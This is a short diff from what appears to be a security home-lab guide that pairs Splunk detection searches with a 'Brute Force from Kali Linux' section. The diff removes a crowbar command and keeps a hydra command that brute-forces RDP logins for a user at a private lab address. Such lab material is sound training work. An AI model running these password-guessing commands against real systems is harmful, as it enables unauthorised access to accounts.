@@ -164,7 +164,6 @@ index=endpoint NewLocalAccount
 
 ### Brute Force from Kali Linux
 ```bash
-crowbar -b rdp -u tsmith -C passwords.txt -s 192.168.10.100/32
 hydra -t 1 -V -f -l tsmith -P passwords.txt rdp://192.168.10.100
 ```
 
